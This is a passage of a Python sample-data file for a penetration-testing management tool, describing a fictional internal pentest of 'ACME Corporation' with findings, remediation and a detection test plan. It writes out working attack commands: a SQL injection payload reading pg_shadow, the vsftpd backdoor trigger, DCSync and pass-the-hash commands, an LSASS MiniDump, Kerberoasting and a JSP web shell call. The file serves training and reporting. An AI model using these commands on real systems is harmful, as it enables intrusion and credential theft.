"""Content of the PTVault sample engagement (read by load_sample.py).

The story: an internal penetration test of the fictional ACME Corporation,
6-15 May 2026. The tester starts with a low-privilege domain account
(assumed breach), scans 10.0.5.0/24, and reaches Domain Admin along two
paths:

  1. SQL injection in the intranet portal (WEB-INT01) leaks the portal_app
     database password, which is reused on the HR database (HR-DB).
  2. Kerberoasting svc_sql gives sysadmin on SQL-PROD01; an LSASS dump there
     yields adm_jsmith's NTLM hash; pass-the-hash and DCSync on DC01.

Side findings: the vsftpd 2.3.4 backdoor on FTP-LEGACY (root), Tomcat
Manager default credentials on ERP-APP01 (shell), SMB signing, SNMP.

Everything is fictional: acme.local / acme.example names, private
10.0.5.0/24 addresses, and invented accounts, passwords and hashes. Edit
freely; keep it fictional.

Markup: Markdown in notes, findings, writeups and report text blocks.
Hosts are referred to by IP; load_sample.py resolves them to IDs.
"""

SHORT_NAME = "ACME-SAMPLE"
SAMPLE_TAG = "sample"          # tag on global items (writeups) so they are easy to find and remove

CLIENT = {
    "name": "ACME Corporation (Sample)",
    "website": "https://www.acme.example",
    "address": "100 Example Way, Springfield",
    "admin_contact_name": "Dana Whitfield",
    "admin_contact_email": "dana.whitfield@acme.example",
    "admin_contact_phone": "+1 555 0100",
    "technical_contact_name": "Sam Ortega",
    "technical_contact_email": "sam.ortega@acme.example",
    "technical_contact_phone": "+1 555 0142",
    "notes": "Fictional client created by the PTVault sample engagement.",
}

ENGAGEMENT = {
    "name": "ACME Corp Internal Pentest (Sample)",
    "short_name": SHORT_NAME,
    "client_name": "ACME Corporation (Sample)",
    "description": (
        "Sample engagement for learning PTVault. Internal network and intranet web "
        "application test of the fictional ACME Corporation, assumed-breach start "
        "with a standard domain user. All data is fictional."
    ),
    "tags": "sample,internal,active-directory,web",
    "start_date": "2026-05-04",
    "end_date": "2026-05-15",
    "status": "active",
    "contact_name": "Sam Ortega",
    "contact_email": "sam.ortega@acme.example",
    "contact_phone": "+1 555 0142",
}

# Tool output imported through Evidence -> Import (parsed on upload).
TOOL_IMPORTS = [
    ("acme_internal_nmap.xml", "Nmap sweep of 10.0.5.0/24",
     "Full TCP connect scan with service detection (-sT -sV -p-), 4 May.", "nmap,recon"),
    ("acme_internal.nessus", "Nessus credentialed scan",
     "Nessus Professional, 'Advanced Scan' policy with domain credentials, 4 May.", "nessus,vuln-scan"),
    ("acme_intranet_burp.xml", "Burp Suite: intranet portal issues",
     "Burp Suite Professional active scan of https://intranet.acme.local, 6 May.", "burp,web"),
]

# A host added by hand (not in any scan): demonstrates manual hosts and ports.
MANUAL_HOSTS = [
    {"ip": "10.0.5.45", "hostname": "WS-FIN-022.acme.local", "os": "Windows 11 Enterprise 23H2",
     "notes": "Finance workstation found through BloodHound sessions; adm_jsmith logged on.",
     "ports": [(135, "tcp", "open", "msrpc", "Microsoft Windows RPC"),
               (445, "tcp", "open", "microsoft-ds", "Microsoft Windows SMB"),
               (3389, "tcp", "filtered", "ms-wbt-server", None)]},
]

# Host indicators and colour categories (Hosts tab, Port Grid, host filters).
HOST_STATUS = {
    "10.0.5.10": {"rooted": True, "flagged": True, "reviewed": True, "color_category": "red",
                  "notes": "Domain controller. DCSync achieved with adm_jsmith's hash."},
    "10.0.5.11": {"reviewed": True, "color_category": "red"},
    "10.0.5.13": {"rooted": True, "color_category": "red",
                  "notes": "svc_sql is sysadmin; xp_cmdshell runs as NT SERVICE\\MSSQLSERVER with SeImpersonate."},
    "10.0.5.26": {"rooted": True, "reviewed": True, "color_category": "red"},
    "10.0.5.28": {"shell": True, "color_category": "orange"},
    "10.0.5.19": {"interested": True, "color_category": "yellow"},
    "10.0.5.29": {"interested": True, "color_category": "yellow"},
    "10.0.5.12": {"interested": True, "flagged": True, "color_category": "purple",
                  "notes": "ProxyNotShell reported by Nessus; not exploited (production mail, client asked us not to)."},
    "10.0.5.22": {"interested": True, "color_category": "teal"},
    "10.0.5.1": {"flagged": True, "color_category": "blue"},
    "10.0.5.18": {"out_of_scope": True, "color_category": "brown",
                  "notes": "VPN gateway is managed by a third party and excluded in the rules of engagement."},
    "10.0.5.33": {"not_interested": True, "reviewed": True, "color_category": "green"},
    "10.0.5.45": {"shell": True, "color_category": "orange"},
}

# Per-host notes (Hosts tab -> Notes). Markdown.
HOST_NOTES = {
    "10.0.5.19": [("Intranet portal", """\
## intranet.acme.local

- nginx 1.18 reverse proxy in front of a Flask app (`/var/www/portal`).
- `/directory/search?q=` is injectable (PostgreSQL, time-based and UNION). See finding
  **SQL injection in intranet directory search**.
- `.env` readable through the injection: `DATABASE_URL` holds the `portal_app` password.

{{shot:shot_sqli}}

### Next steps
- [x] Confirm injection with sqlmap (`--level 3 --risk 1`, read-only)
- [x] Try `portal_app` on HR-DB
- [ ] Check whether the stored XSS reaches admin users
""")],
    "10.0.5.13": [("Path to sysadmin", """\
1. Kerberoasted `svc_sql` (SPN `MSSQLSvc/SQL-PROD01.acme.local:1433`).
2. Cracked in under a second with `rockyou.txt` + `best64.rule`: password last set 2019.
3. `mssqlclient.py acme.local/svc_sql@10.0.5.13 -windows-auth` → `enable_xp_cmdshell`.
4. SeImpersonatePrivilege → SYSTEM with a potato variant; LSASS dumped with `nanodump`.

{{shot:shot_kerb}}
""")],
    "10.0.5.10": [("DC01", """\
- `adm_jsmith` (Domain Admins) NTLM hash from SQL-PROD01 LSASS.
- `secretsdump.py -just-dc-user krbtgt` succeeded: **domain compromise**.
- Zerologon (CVE-2020-1472) reported by Nessus: **not exploited** (destructive; out of the RoE).

{{shot:shot_dcsync}}
""")],
    "10.0.5.26": [("vsftpd backdoor", "Smiley-face backdoor (`USER x:)`) opens a root shell on 6200/tcp. "
                                    "Host is CentOS 6, end of life since 2020.\n\n{{shot:shot_ftp}}\n")],
}

# Credentials found on hosts (Hosts tab -> Credentials). password_type: cleartext | hash.
HOST_CREDENTIALS = {
    "10.0.5.19": [{"username": "portal_app", "password": "Intr4net!2024", "password_type": "cleartext",
                   "service": "postgresql", "notes": "From /var/www/portal/.env via SQL injection."}],
    "10.0.5.29": [{"username": "portal_app", "password": "Intr4net!2024", "password_type": "cleartext",
                   "service": "postgresql", "notes": "Same password works on HR-DB (credential reuse)."}],
    "10.0.5.28": [{"username": "tomcat", "password": "s3cret", "password_type": "cleartext",
                   "service": "tomcat-manager", "notes": "Default Tomcat Manager credentials on 8443."},
                  {"username": "svc_backup", "password": "Backup#2023", "password_type": "cleartext",
                   "service": "smb", "notes": "Found in /opt/erp/conf/backup.properties."}],
    "10.0.5.26": [{"username": "root", "password": "$6$Zq1v$Qm3o8kR2Fv0eH7yX1cJ9sLwT5nB4pD6aG8uE2iO0rK3mN1vC7xZ9yW5qA2tS4hJ6lF8dP0gU3bY1",
                   "password_type": "hash", "hash_type": "sha512crypt", "service": "ssh",
                   "notes": "From /etc/shadow; not cracked."}],
    "10.0.5.13": [{"username": "svc_sql", "password": "Summer2019!", "password_type": "cleartext",
                   "service": "mssql", "notes": "Cracked from the Kerberoast TGS."},
                  {"username": "ACME\\adm_jsmith", "password": "8f3c2a91d04b7e65c1a9f0e3d2b4c6a8",
                   "password_type": "hash", "hash_type": "NTLM", "service": "smb",
                   "notes": "From the LSASS dump. Member of Domain Admins."}],
    "10.0.5.10": [{"username": "krbtgt", "password": "2b7e4d9a6c13f05e8a1d3c7b9f2e6a40",
                   "password_type": "hash", "hash_type": "NTLM", "service": "kerberos",
                   "notes": "DCSync. Rotate twice after remediation."}],
}

# Engagement-wide credentials (General -> Credentials).
# credential_type: clear_text | ntlm | ntlmv2 | krbtgt | md5 | sha
ENGAGEMENT_CREDENTIALS = [
    {"username": "ACME\\j.doe", "password_or_hash": "Welcome2026!", "credential_type": "clear_text",
     "description": "Assumed-breach account supplied by ACME IT (standard domain user)."},
    {"username": "ACME\\svc_sql", "password_or_hash": "Summer2019!", "credential_type": "clear_text",
     "description": "Kerberoasted service account; sysadmin on SQL-PROD01."},
    {"username": "ACME\\adm_jsmith", "password_or_hash": "8f3c2a91d04b7e65c1a9f0e3d2b4c6a8", "credential_type": "ntlm",
     "description": "Domain Admin hash from SQL-PROD01 LSASS."},
    {"username": "krbtgt", "password_or_hash": "2b7e4d9a6c13f05e8a1d3c7b9f2e6a40", "credential_type": "krbtgt",
     "description": "krbtgt NT hash from DCSync on DC01."},
]

# Engagement notes tree (General -> Notes). (key, title, parent key or None, markdown)
ENGAGEMENT_NOTES = [
    ("welcome", "Start here: about this sample", None, """\
# Welcome to the PTVault sample engagement

This engagement is **fictional**. It exists so you can click through every part of PTVault
with realistic data. Nothing here describes a real organisation.

| Where to look | What it shows |
|---|---|
| **Dashboard** | totals, findings by severity, scanner results, top ports, host status |
| **Hosts** | 22 hosts: 20 from the Nmap scan, `intranet.acme.local` from the Burp import, one added by hand. Open SQL-PROD01 or DC01 for notes with screenshots, ports, findings (manual and Nessus) and credentials. Try the indicator and colour filters and the **Saved Searches** |
| **Port Grid** | open and filtered ports across the subnet |
| **General** | these notes (a tree: open *Daily log*), engagement credentials, terminal dumps and the curated findings |
| **Tools → Attack Maps** | the attack path from a standard user to Domain Admin |
| **Tools → Command** | sample commands with `{variables}` |
| **Test Plans** | *Navigator Import*: an ATT&CK layer; *Plans* and *Executions*: a detection test run against DC01 |
| **Reporting** | *Writeups Database*: sample writeups; *Report Generation*: open *ACME internal pentest report (sample)* and export it |

Delete it from **Engagements** when you are done; reload it with `sample_data/load_sample.py`.
"""),
    ("roe", "Rules of engagement", None, """\
- **Window:** 4-15 May 2026, 08:00-18:00 local; out-of-hours by agreement.
- **Start point:** assumed breach, standard user `ACME\\j.doe`, laptop on the user VLAN.
- **In scope:** 10.0.5.0/24, `intranet.acme.local`.
- **Out of scope:** `VPN-GW` (10.0.5.18, third party), denial of service, Zerologon exploitation, phishing.
- **Emergency contact:** Sam Ortega, +1 555 0142.
"""),
    ("log", "Daily log", None, "One child note per test day."),
    ("day1", "Day 1 (4 May): discovery", "log", """\
- Nmap full TCP sweep: 20 live hosts, 2 DCs, Exchange, 2 SQL Servers.
- Nessus credentialed scan imported: 5 critical (Zerologon, ProxyNotShell, vsftpd backdoor, EOL OS, Tomcat default creds).
- BloodHound collection as j.doe; `svc_sql` is kerberoastable and in *SQL Admins*.
"""),
    ("day2", "Day 2 (5 May): Active Directory", "log", """\
- Kerberoasted `svc_sql`, cracked offline: `Summer2019!`.
- sysadmin on SQL-PROD01 → xp_cmdshell → SYSTEM → LSASS dump.
- `adm_jsmith` NTLM hash → pass-the-hash to DC01 → **DCSync of krbtgt** (see terminal dump).
"""),
    ("day3", "Day 3 (6 May): web and legacy", "log", """\
- Burp scan of the intranet portal: SQL injection in directory search, stored XSS in profile.
- `portal_app` password from `.env` reused on HR-DB (PostgreSQL): read access to employee salaries.
- vsftpd 2.3.4 backdoor on FTP-LEGACY: root shell.
- Tomcat Manager `tomcat:s3cret` on ERP-APP01: WAR shell as `tomcat`.
"""),
    ("cleanup", "Clean-up checklist", None, """\
- [x] Removed WAR `/ptv-probe` from ERP-APP01 Tomcat
- [x] Disabled xp_cmdshell on SQL-PROD01 (was off before testing)
- [x] Deleted nanodump output from `C:\\Windows\\Temp`
- [ ] Ask ACME to reset `svc_sql`, `adm_jsmith` and **krbtgt (twice)**
"""),
]

# General -> Terminal Dumps
TERMINAL_DUMPS = [
    {"title": "vsftpd 2.3.4 backdoor on FTP-LEGACY", "session_datetime": "2026-05-06T10:12:00",
     "content": """kali@attack-box:~$ nc 10.0.5.26 21
220 (vsFTPd 2.3.4)
USER probe:)
331 Please specify the password.
PASS x
^C
kali@attack-box:~$ nc 10.0.5.26 6200
id
uid=0(root) gid=0(root) groups=0(root)
cat /etc/redhat-release
CentOS release 6.10 (Final)
"""},
    {"title": "MSSQL xp_cmdshell as svc_sql", "session_datetime": "2026-05-05T11:40:00",
     "content": """kali@attack-box:~/acme$ mssqlclient.py acme.local/svc_sql:'Summer2019!'@10.0.5.13 -windows-auth
[*] ENVCHANGE(DATABASE): Old Value: master, New Value: master
SQL (ACME\\svc_sql  dbo@master)> enable_xp_cmdshell
[*] INFO(SQL-PROD01): Line 185: Configuration option 'xp_cmdshell' changed from 0 to 1.
SQL (ACME\\svc_sql  dbo@master)> xp_cmdshell whoami /priv | findstr Impersonate
SeImpersonatePrivilege        Impersonate a client after authentication Enabled
"""},
    {"title": "DCSync of krbtgt", "session_datetime": "2026-05-05T15:02:00",
     "content": """kali@attack-box:~/acme$ secretsdump.py -hashes :8f3c2a91d04b7e65c1a9f0e3d2b4c6a8 acme.local/adm_jsmith@10.0.5.10 -just-dc-user krbtgt
[*] Dumping Domain Credentials (domain\\uid:rid:lmhash:nthash)
[*] Using the DRSUAPI method to get NTDS.DIT secrets
krbtgt:502:aad3b435b51404eeaad3b435b51404ee:2b7e4d9a6c13f05e8a1d3c7b9f2e6a40:::
[*] Cleaning up...
"""},
]

# General -> Findings (engagement findings; these feed the report builder).
FINDINGS = [
    {"key": "kerberoast", "title": "Domain compromise through a Kerberoastable service account",
     "ip_address": "10.0.5.13", "hostname": "SQL-PROD01.acme.local", "criticality": "critical", "cvss_score": 9.0,
     "finding_content": """\
The service account `svc_sql` has a Service Principal Name and a weak password set in 2019. Any
domain user can request a Kerberos service ticket for it and crack the ticket offline.

`svc_sql` is sysadmin on SQL-PROD01. From there the tester obtained SYSTEM, dumped LSASS, recovered
the NTLM hash of `adm_jsmith` (Domain Admins), and performed a DCSync of `krbtgt` on DC01.

**Attack path:** j.doe → Kerberoast `svc_sql` → SQL-PROD01 → LSASS → `adm_jsmith` → DCSync.""",
     "remediation_content": """\
1. Give `svc_sql` a 30+ character random password, or replace it with a group Managed Service Account (gMSA).
2. Remove `svc_sql` from *SQL Admins*; grant only the database rights it needs.
3. Prevent Domain Admins from logging on to member servers (tiering / Protected Users).
4. Reset `adm_jsmith` and reset **krbtgt twice**, ten hours apart."""},
    {"key": "vsftpd", "title": "vsftpd 2.3.4 backdoor gives unauthenticated root",
     "ip_address": "10.0.5.26", "hostname": "FTP-LEGACY.acme.local", "criticality": "critical", "cvss_score": 10.0,
     "finding_content": "FTP-LEGACY runs the backdoored vsftpd 2.3.4 release. A username ending in `:)` opens a root shell on TCP 6200. The host runs CentOS 6, which is end of life.",
     "remediation_content": "Decommission FTP-LEGACY or rebuild it on a supported OS. If FTP is needed, use SFTP on a maintained server."},
    {"key": "sqli", "title": "SQL injection in intranet directory search",
     "ip_address": "10.0.5.19", "hostname": "intranet.acme.local", "criticality": "high", "cvss_score": 8.8,
     "finding_content": """\
The `q` parameter of `/directory/search` is concatenated into a PostgreSQL query. Any authenticated
employee can read the whole database, including password hashes in `pg_shadow` and the application's
`.env` file through `pg_read_file`.

```
GET /directory/search?q=zz'+UNION+SELECT+usename,passwd,null,null+FROM+pg_shadow--
```""",
     "remediation_content": "Use parameterised queries. Run the portal as a database role without superuser rights and without file access."},
    {"key": "tomcat", "title": "Apache Tomcat Manager uses default credentials",
     "ip_address": "10.0.5.28", "hostname": "ERP-APP01.acme.local", "criticality": "high", "cvss_score": 8.8,
     "finding_content": "Tomcat Manager on 8443 accepts `tomcat` / `s3cret`. The tester deployed a WAR file and ran commands as the `tomcat` user, then found `svc_backup` credentials in the ERP configuration.",
     "remediation_content": "Change the Manager password, restrict `/manager` to an admin network, and remove credentials from configuration files."},
    {"key": "reuse", "title": "Database password reused between the intranet portal and HR-DB",
     "ip_address": "10.0.5.29", "hostname": "HR-DB.acme.local", "criticality": "high", "cvss_score": 7.5,
     "finding_content": "The `portal_app` password recovered from the portal's `.env` also logs in to the HR PostgreSQL database, which holds salary and bank details for every employee.",
     "remediation_content": "Use a separate role and password per application; store secrets in a vault and rotate both now."},
    {"key": "smb", "title": "SMB signing not required on domain controllers",
     "ip_address": "10.0.5.10", "hostname": "DC01.acme.local", "criticality": "medium", "cvss_score": 5.3,
     "finding_content": "DC01 and DC02 do not require SMB signing, which allows NTLM relay attacks against them.",
     "remediation_content": "Enable 'Microsoft network server: Digitally sign communications (always)' through Group Policy."},
    {"key": "snmp", "title": "SNMP default community string on the core router",
     "ip_address": "10.0.5.1", "hostname": "CORE-RTR01.acme.local", "criticality": "medium", "cvss_score": 5.3,
     "finding_content": "CORE-RTR01 answers SNMPv2c with the community `public`, exposing the routing table and interface configuration. Telnet is also enabled.",
     "remediation_content": "Move to SNMPv3 with authentication and privacy, or change the community and restrict it by ACL. Disable Telnet."},
    {"key": "tls", "title": "TLS 1.0 enabled on Exchange",
     "ip_address": "10.0.5.12", "hostname": "EXCHANGE01.acme.local", "criticality": "low", "cvss_score": 3.7,
     "finding_content": "EXCHANGE01 still negotiates TLS 1.0 on 443.", "include_in_report": False,
     "remediation_content": "Disable TLS 1.0 and 1.1 in SCHANNEL."},
]

# Evidence that is not a tool import. type: note | command_output | screenshot | other.
# "file" = a file in sample_data/files; "hosts" = IPs to link it to.
EVIDENCE = [
    {"key": "shot_sqli", "evidence_type": "screenshot", "title": "UNION injection returns pg_shadow",
     "content": "UNION-based injection in /directory/search returns database users and hashes.",
     "tags": "sqli,web,critical-path", "file": "shot_sqli_union.png", "hosts": ["10.0.5.19"]},
    {"key": "shot_kerb", "evidence_type": "screenshot", "title": "Kerberoast of svc_sql cracked",
     "content": "GetUserSPNs.py request and hashcat crack of the svc_sql TGS.",
     "tags": "kerberos,active-directory,critical-path", "file": "shot_kerberoast.png", "hosts": ["10.0.5.13"]},
    {"key": "shot_dcsync", "evidence_type": "screenshot", "title": "DCSync of krbtgt from DC01",
     "content": "secretsdump.py with adm_jsmith's hash returns the krbtgt NT hash.",
     "tags": "active-directory,domain-admin,critical-path", "file": "shot_dcsync.png", "hosts": ["10.0.5.10"]},
    {"key": "shot_ftp", "evidence_type": "screenshot", "title": "vsftpd backdoor root shell",
     "content": "Root shell on FTP-LEGACY through the vsftpd 2.3.4 backdoor.",
     "tags": "legacy,linux", "file": "shot_vsftpd_root.png", "hosts": ["10.0.5.26"]},
    {"key": "bh_note", "evidence_type": "note", "title": "BloodHound: shortest path to Domain Admins",
     "content": """j.doe → (Kerberoast) svc_sql → AdminTo SQL-PROD01 → HasSession adm_jsmith → MemberOf DOMAIN ADMINS.
adm_jsmith also has a session on WS-FIN-022 (10.0.5.45).""",
     "tags": "bloodhound,active-directory", "hosts": ["10.0.5.13", "10.0.5.45"]},
    {"key": "lsass", "evidence_type": "command_output", "title": "LSASS dump parsed with pypykatz",
     "content": """$ pypykatz lsa minidump sqlprod01.dmp | grep -A3 adm_jsmith
== MSV ==
    Username: adm_jsmith
    Domain: ACME
    NT: 8f3c2a91d04b7e65c1a9f0e3d2b4c6a8""",
     "tags": "credentials,active-directory,critical-path", "hosts": ["10.0.5.13"]},
    {"key": "hrdb", "evidence_type": "command_output", "title": "HR-DB login with the reused portal_app password",
     "content": """$ psql -h 10.0.5.29 -U portal_app hr -c 'select count(*) from employee_bank_details;'
 count
-------
  1214""",
     "tags": "credential-reuse,database", "hosts": ["10.0.5.29"]},
    {"key": "tomcat_war", "evidence_type": "command_output", "title": "WAR deployed through Tomcat Manager",
     "content": """$ curl -u tomcat:s3cret -T probe.war 'https://10.0.5.28:8443/manager/text/deploy?path=/ptv-probe'
OK - Deployed application at context path [/ptv-probe]
$ curl -k 'https://10.0.5.28:8443/ptv-probe/cmd.jsp?c=id'
uid=91(tomcat) gid=91(tomcat) groups=91(tomcat)""",
     "tags": "web,default-credentials", "hosts": ["10.0.5.28"]},
]

# Relationships between evidence, findings, notes and credentials
# (Relationships view). Endpoints are ("evidence"|"finding"|"credential"|"note", key).
RELATIONSHIPS = [
    (("evidence", "bh_note"), ("evidence", "shot_kerb"), "leads_to", "BloodHound shows svc_sql is kerberoastable"),
    (("evidence", "shot_kerb"), ("credential", "svc_sql"), "discovers", "Cracked TGS"),
    (("credential", "svc_sql"), ("evidence", "lsass"), "leads_to", "sysadmin → SYSTEM → LSASS"),
    (("evidence", "lsass"), ("credential", "adm_jsmith"), "discovers", "NTLM hash of a Domain Admin"),
    (("credential", "adm_jsmith"), ("evidence", "shot_dcsync"), "escalates", "Pass-the-hash to DC01"),
    (("evidence", "shot_dcsync"), ("finding", "kerberoast"), "exploits", None),
    (("evidence", "shot_sqli"), ("finding", "sqli"), "exploits", None),
    (("evidence", "shot_sqli"), ("evidence", "hrdb"), "leads_to", "portal_app password reused"),
    (("evidence", "hrdb"), ("finding", "reuse"), "exploits", None),
    (("evidence", "tomcat_war"), ("finding", "tomcat"), "exploits", None),
    (("evidence", "shot_ftp"), ("finding", "vsftpd"), "exploits", None),
    (("note", "day2"), ("finding", "kerberoast"), "uses", "Narrative of the AD path"),
]
# Saved attack path (Relationships -> Paths): from the BloodHound note to the DCSync screenshot.
SAVED_PATH = {"name": "Assumed breach to Domain Admin", "start": "bh_note", "end": "shot_dcsync",
              "description": "Kerberoast → SQL-PROD01 → LSASS → pass-the-hash → DCSync."}

# Attack map (Attack Maps). Node types: recon, tactic, exploit, connector,
# host_ref (ref = IP), finding_ref (ref = finding key), evidence_ref (ref = evidence key).
ATTACK_MAP = {
    "name": "ACME: assumed breach to Domain Admin",
    "description": "Two paths from a standard user to domain compromise.",
    "nodes": [
        ("start", "recon", 40, 260, "Assumed breach: j.doe", {"description": "Standard domain user on the user VLAN"}),
        ("bh", "recon", 320, 120, "BloodHound collection", {"ttp": "T1087.002"}),
        ("kerb", "tactic", 600, 120, "Kerberoast svc_sql", {"ttp": "T1558.003"}),
        ("sql", "host_ref", 880, 120, "SQL-PROD01", {"ref": "10.0.5.13"}),
        ("lsass", "exploit", 1160, 120, "LSASS dump", {"ttp": "T1003.001", "service": "mssql xp_cmdshell"}),
        ("pth", "tactic", 1440, 120, "Pass-the-hash adm_jsmith", {"ttp": "T1550.002"}),
        ("dc", "host_ref", 1720, 260, "DC01", {"ref": "10.0.5.10"}),
        ("dcsync", "evidence_ref", 1720, 420, "DCSync of krbtgt", {"ref": "shot_dcsync"}),
        ("web", "host_ref", 320, 420, "WEB-INT01", {"ref": "10.0.5.19"}),
        ("sqli", "finding_ref", 600, 420, "SQL injection", {"ref": "sqli"}),
        ("reuse", "exploit", 880, 420, "Reuse portal_app on HR-DB", {"ttp": "T1078", "service": "postgresql"}),
        ("hr", "host_ref", 1160, 420, "HR-DB", {"ref": "10.0.5.29"}),
        ("or", "connector", 1500, 300, "OR", {}),
        ("da", "finding_ref", 2000, 260, "Domain compromise", {"ref": "kerberoast"}),
    ],
    "edges": [
        ("start", "bh", None), ("bh", "kerb", "svc_sql has an SPN"), ("kerb", "sql", "Summer2019!"),
        ("sql", "lsass", "SYSTEM"), ("lsass", "pth", "NTLM hash"), ("pth", "or", None), ("or", "dc", None),
        ("dc", "dcsync", None), ("dc", "da", None),
        ("start", "web", "employee login"), ("web", "sqli", None), ("sqli", "reuse", ".env password"),
        ("reuse", "hr", "salary data"),
    ],
}

# Saved host searches (Hosts -> Saved Searches). Keys as the Hosts page saves
# them: indicators, severity, cidr, colors, search_query.
SAVED_FILTERS = [
    {"name": "Compromised hosts", "description": "Rooted or shell",
     "filter_json": {"indicators": ["rooted", "shell"]}},
    {"name": "Critical scanner findings", "description": "Hosts with a critical Nessus result",
     "filter_json": {"severity": "critical"}},
    {"name": "Server range 10.0.5.0/27", "description": "CIDR search",
     "filter_json": {"cidr": "10.0.5.0/27"}},
    {"name": "Crown jewels (red)", "description": "Hosts coloured red",
     "filter_json": {"colors": ["red"]}},
    {"name": "Kerberos", "description": "Keyword search across notes, findings and scan data",
     "filter_json": {"search_query": "kerberos"}},
]

# Global writeup library (Reporting -> Writeups). Tagged SAMPLE_TAG.
WRITEUPS = [
    {"name": "Executive summary (sample)", "writeup_type": "narrative", "category": "Executive Summary",
     "description": """\
ACME Corporation engaged us to test its internal network and intranet portal between 4 and 15 May 2026.
Starting from a standard employee account, the tester gained **full control of the ACME Active Directory
domain within two days**, and separately read the HR database, which holds bank details for every employee.

The root causes are a weak service-account password, password reuse between systems, and unsupported
software. Fixing the five critical and high findings removes every path the tester used."""},
    {"name": "Methodology (sample)", "writeup_type": "narrative", "category": "Methodology",
     "description": """\
Testing followed the PTES phases: discovery (Nmap, Nessus, BloodHound), vulnerability analysis,
exploitation within the rules of engagement, post-exploitation, and clean-up. Destructive exploits
(Zerologon) and denial of service were excluded."""},
    {"name": "Kerberoasting (sample)", "writeup_type": "finding", "category": "Active Directory",
     "criticality": "high", "cvss_score": 8.1,
     "description": "Service accounts with SPNs and weak passwords can be cracked offline by any domain user.",
     "remediation": "Use gMSAs or 30+ character random passwords; monitor for RC4 TGS requests (event 4769)."},
    {"name": "Default credentials (sample)", "writeup_type": "finding", "category": "Configuration",
     "criticality": "high", "cvss_score": 8.8,
     "description": "A management interface accepts the vendor's default username and password.",
     "remediation": "Change default credentials at deployment and restrict management interfaces by network."},
]

# Command library (Tools -> Commands).
COMMANDS = [
    {"name": "Kerberoast all SPNs (sample)", "category": "Post-exploitation",
     "command": "GetUserSPNs.py {domain}/{user}:'{password}' -dc-ip {dc_ip} -request -outputfile {outfile}",
     "description": "Request TGS tickets for every account with an SPN."},
    {"name": "DCSync one user (sample)", "category": "Post-exploitation",
     "command": "secretsdump.py -hashes :{nthash} {domain}/{user}@{dc_ip} -just-dc-user {target}",
     "description": "Replicate one account's secrets from a DC."},
    {"name": "Nmap full TCP with versions (sample)", "category": "Recon",
     "command": "nmap -sT -sV -p- --min-rate 2000 -oA {outfile} {target}",
     "description": "Full TCP connect scan with service detection; -oX output imports into PTVault."},
]

ATTACK_LAYER_FILE = "acme_attack_layer.json"

# Test plan (Test Plans). Custom items, so no Atomic Red Team download is needed.
TEST_PLAN = {
    "name": "ACME AD attack simulation (sample)",
    "description": "Detection test of the techniques used in the engagement, run against DC01 with the blue team.",
    "target_platform": "windows",
    "tags": "sample,active-directory,purple-team",
    "items": [
        {"custom_name": "Kerberoast request (T1558.003)", "custom_platform": "windows",
         "custom_command": "Rubeus.exe kerberoast /user:svc_sql /nowrap",
         "result": {"status": "completed", "outcome": "not_detected",
                    "execution_notes": "No alert for the RC4 TGS request. Event 4769 is logged but not alerted on."}},
        {"custom_name": "LSASS access (T1003.001)", "custom_platform": "windows",
         "custom_command": "rundll32.exe C:\\Windows\\System32\\comsvcs.dll, MiniDump <lsass_pid> C:\\Windows\\Temp\\l.dmp full",
         "result": {"status": "completed", "outcome": "prevented", "detected_by": "Defender for Endpoint",
                    "execution_notes": "Blocked by ASR rule 'Block credential stealing from LSASS'."}},
        {"custom_name": "DCSync (T1003.006)", "custom_platform": "windows",
         "custom_command": "secretsdump.py -just-dc-user krbtgt acme.local/adm_test@10.0.5.10",
         "result": {"status": "completed", "outcome": "alerted", "detected_by": "Defender for Identity",
                    "execution_notes": "'Suspected DCSync attack' alert after 3 minutes.", "evidence": "shot_dcsync"}},
        {"custom_name": "Pass-the-hash over SMB (T1550.002)", "custom_platform": "windows",
         "custom_command": "psexec.py -hashes :<nthash> acme.local/adm_test@10.0.5.10",
         "result": {"status": "completed", "outcome": "logged",
                    "execution_notes": "Event 4624 logon type 3 with NTLM recorded; no alert."}},
        {"custom_name": "Add user to Domain Admins (T1098)", "custom_platform": "windows",
         "custom_command": "net group \"Domain Admins\" ptv_test /add /domain",
         "result": {"status": "skipped", "execution_notes": "Not approved by the change board this week."}},
    ],
}

# Report (Reporting -> Report builder). Item kinds:
#   ("tool", tool_id, toolData)        format tool
#   ("table", headers, rows)           plain table
#   ("finding", key)                   engagement finding
#   ("writeup", name)                  writeup from the library
#   ("attackmap",)                     the attack map above
REPORT_NAME = "ACME internal pentest report (sample)"
REPORT = [
    ("tool", "sectionheader", {"text": "ACME Corporation: internal penetration test", "level": 1, "numbered": False, "number": ""}),
    ("tool", "textblock", {"content": "**Sample report.** Fictional client and data, generated by PTVault's sample engagement."}),
    ("tool", "pagebreak", {}),
    ("tool", "sectionheader", {"text": "Executive summary", "level": 2, "numbered": True, "number": "1"}),
    ("writeup", "Executive summary (sample)"),
    ("tool", "keyfinding", {"title": "Domain compromise in two days", "content": "A standard employee account reached Domain Admin through a Kerberoastable service account."}),
    ("tool", "riskmatrix", {"size": 3, "highlighted": {"row": 0, "col": 2}}),
    ("tool", "coloredtable", {
        "headers": ["Finding", "Severity", "Status"],
        "rows": [
            [{"text": "Domain compromise via Kerberoasting", "color": None}, {"text": "Critical", "color": "red"}, {"text": "Open", "color": "orange"}],
            [{"text": "vsftpd 2.3.4 backdoor", "color": None}, {"text": "Critical", "color": "red"}, {"text": "Open", "color": "orange"}],
            [{"text": "SQL injection in directory search", "color": None}, {"text": "High", "color": "orange"}, {"text": "Open", "color": "orange"}],
            [{"text": "Tomcat default credentials", "color": None}, {"text": "High", "color": "orange"}, {"text": "Fixed during test", "color": "green"}],
            [{"text": "SMB signing not required", "color": None}, {"text": "Medium", "color": "yellow"}, {"text": "Open", "color": "orange"}],
        ]}),
    ("tool", "sectionheader", {"text": "Scope and methodology", "level": 2, "numbered": True, "number": "2"}),
    ("writeup", "Methodology (sample)"),
    ("table", ["Item", "Detail"], [["Network", "10.0.5.0/24"], ["Web application", "https://intranet.acme.local"],
                                   ["Window", "4-15 May 2026"], ["Start point", "Standard domain user"]]),
    ("tool", "alertbox", {"type": "info", "title": "Out of scope", "content": "VPN-GW (third party), denial of service and Zerologon exploitation."}),
    ("tool", "sectionheader", {"text": "Attack narrative", "level": 2, "numbered": True, "number": "3"}),
    ("tool", "timeline", {"steps": [
        {"time": "4 May", "title": "Discovery", "description": "Nmap, Nessus and BloodHound as j.doe."},
        {"time": "5 May 10:20", "title": "Kerberoast", "description": "svc_sql ticket cracked offline."},
        {"time": "5 May 11:40", "title": "SQL-PROD01", "description": "xp_cmdshell, SYSTEM, LSASS dump."},
